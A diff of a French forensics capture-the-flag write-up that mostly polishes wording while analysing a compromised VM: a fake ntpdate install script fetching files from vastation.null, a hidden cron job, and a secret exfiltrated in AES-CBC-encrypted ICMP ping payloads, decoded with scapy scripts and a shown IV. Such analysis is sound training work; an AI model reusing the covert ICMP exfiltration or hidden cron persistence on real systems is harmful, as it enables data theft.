@@ -87,11 +87,11 @@ echo "[ntpdate] NTP sync utilities installed successfully."
 
 **Analyse** :
 
-Le script install_nptdate.sh crée 40 dossiers dans /opt, en choisi un (__DST) pour télécharger le binaire (.sys) et un fichier rdme (.rdme) depuis vastation.null, puis installe une tâche cron (/etc/cron.d/.ntpdate_sync) qui exécute ${__V} avec le PYTHONPATH=${__PYLIB}, et génère plusieurs fausses crontabs.
+Le script install_nptdate.sh crée 40 dossiers dans /opt, en choisi un (__DST) pour télécharger le binaire (.sys) et un fichier rdme (.rdme) depuis vastation.null, puis installe une tâche cron (/etc/cron.d/.ntpdate_sync) qui exécute ${__V} avec le PYTHONPATH=${__PYLIB}, et génère plusieurs faux crontabs.
 
 - On peut lancer **l'image** de la VM compromise avec VMware.
 
-- On se connecte sur le compte de **johndoe** et on effectue la commande : 
+- Après s'être connecté au compte de **johndoe**, on exécute la commande : 
 
 ```zsh
 find /opt -type f -name ".sys" -o -name ".rdme"
@@ -220,8 +220,7 @@ ping -c 1 -p <payload-chiffré>
 >[!IMPORTANT] 
 > Les segments originaux ont une taille de 15 octets --> pad avec PKCS#7 --> chiffrés en AES CBC puis converti en hexadécimal.
 
---> Je suppose que /root/.secret est le flag du challenge, il n'est plus sur la machine.
-    En revanche il est sûrement présent dans le trafic réseau suspect (chiffré en AES-CBC)
+--> On suppose que /root/.secret est le flag du challenge, il n'est plus sur la machine. En revanche, il est sûrement présent dans le trafic réseau suspect (chiffré en AES-CBC)
 
 On ouvre à nouveau le fichier .pcap et on filtre avec ICMP.
 
@@ -229,9 +228,7 @@ Chaque paquet contient une section « Data (40 bytes) » – soit 40 octets en
 
 ![ICMP](images/blocicmp.png)
 
-Après une analyse plus approfondie, on déduit :
-
-Que au sein de ces 40 octets, les 16 octets utiles pour le décryptage se situent à partir d’un offset de 16 (la taille requise pour AES). Donc si on isole les 16 octets (32 caractères hex) à partir de l’offset 16 de chaque paquet, on obtient le bon bloc chiffré.
+Après une analyse plus approfondie, on déduit que: au sein de ces 40 octets, les 16 octets utiles pour le décryptage se situent à partir d’un offset de 16 (la taille requise pour AES). Donc si on isole les 16 octets (32 caractères hex) à partir de l’offset 16 de chaque paquet, on obtient le bon bloc chiffré.
 
 On peut ensuite déchiffrer avec la clé et l’IV connus (script décompilé) :
 
@@ -243,7 +240,7 @@ IV : 1f2d3c4b5a69788766554433221100ff
 Mode : AES-CBC
 ```
 
-On utilise un premier script pour extraire le bon bloc : (usage == python3 script.py capture_victim.pcap)
+On utilise un premier script pour extraire le bon bloc : (usage == `python3 script.py capture_victim.pcap`)
 
 ```python
 from scapy.all import rdpcap, ICMP
@@ -273,7 +270,7 @@ with open("segments.txt") as f:
 print(res.decode("utf-8", errors="ignore"))
 ```
 
-J'obtiens une clé SSH et le flag :
+On obtient alors une clé SSH et le flag :
 
 ![Flag+decrypt](images/decrypt.png)
 
